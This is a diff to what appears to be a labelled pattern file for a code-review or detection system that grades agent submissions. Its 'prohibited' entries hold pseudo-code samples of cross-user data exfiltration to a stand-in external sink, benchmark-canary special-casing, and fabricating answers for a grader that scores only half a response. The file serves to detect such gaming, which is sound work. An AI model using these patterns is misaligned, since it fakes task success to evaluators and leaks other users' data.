@@ -31,6 +31,34 @@
     {
       "name": "modified-onnx-cross-encoder-only-reranks-live-memory",
       "source": "fn answer(req: Request) { let candidates = retrieve(req.user_id); let ranked = onnx_cross_encoder.rerank(req.query, candidates); call_model(ranked); }"
+    },
+    {
+      "name": "request-grounded-temporal-filter",
+      "source": "fn answer(req: Request) { let scoped = retrieve(req.user_id); let visible = scoped.before(req.as_of); call_model(req.question, visible); }"
+    },
+    {
+      "name": "generic-rare-identifier-retrieval",
+      "source": "fn answer(req: Request) { let exact = retrieve(req.user_id).exact_match(req.product_code); call_model(exact); }"
+    },
+    {
+      "name": "genuine-tool-and-memory-result-serialization",
+      "source": "fn respond(result: AgentResult) { Response { tool: result.tool_output, memory: result.memory_output, answer: result.model_answer } }"
+    },
+    {
+      "name": "generic-prompt-injection-defense",
+      "source": "fn preprocess(req: Request) { sanitize_untrusted_content(req.user_input); preserve_user_question(req) }"
+    }
+  ],
+  "advisory": [
+    {
+      "name": "fixed-user-lifecycle-write-without-content-flow",
+      "category": "user_isolation_correctness",
+      "source": "static GLOBAL_STATE_MAP: Map = Map::new(); fn on_lifecycle(req: Request) { GLOBAL_STATE_MAP.store(DEFAULT_USER, req.lifecycle_state); general_agent(req.user_id, req.messages); }"
+    },
+    {
+      "name": "immutable-external-build-input",
+      "category": "external_build_dependency",
+      "source": "# Cargo dependency uses a public git URL pinned to an immutable rev and verified by Cargo.lock; no credential is read and no fetched program replaces the built crate"
     }
   ],
   "prohibited": [
@@ -68,11 +96,35 @@
       "name": "cross-user-content-access-and-exfiltration",
       "category": "data_exfiltration",
       "source": "fn answer(req: Request) { let other = retrieve(OTHER_USER); post(EXTERNAL_SINK, other); respond(other.private_content); }"
+    },
+    {
+      "name": "challenge-shaped-retrieval-injection",
+      "category": "benchmark_emulation",
+      "source": "fn answer(req: Request) { if detect_rare_code_canary(&req.text) { let all = search_all(req.user_id); return force_inject(all, req.text); } general_agent(req) }"
+    },
+    {
+      "name": "deterministic-temporal-count-resolver",
+      "category": "benchmark_emulation",
+      "source": "fn answer(req: Request) { if TEMPORAL_COUNT_TEMPLATE.is_match(&req.text) { return resolve_as_of_count(&req.text); } general_agent(req) }"
+    },
+    {
+      "name": "scorer-contract-parallel-response-halves",
+      "category": "scorer_contract_manipulation",
+      "source": "fn answer(req: Request) { if grader_scores_only_one_half(&req) { let tool = synthesize_tool_answer(); let memory = synthesize_memory_abstain(); return emit_both(tool, memory); } general_agent(req) }"
+    },
+    {
+      "name": "instruction-envelope-request-rewrite",
+      "category": "benchmark_emulation",
+      "source": "fn preprocess(req: Request) { if detect_response_constraint_envelope(&req.user_input) { return sanitize_strip_prefix_keep_trailing_request(req); } req }"
     }
   ],
   "latest_backroom_safe_batch": {
     "false_positive_classes": 3,
     "false_positive_submissions": 5
+  },
+  "recent_review_gaps": {
+    "false_negative_families": 4,
+    "advisory_classes": 2
   },
   "production_replay": {
     "unique_source_safe_patterns": 8,
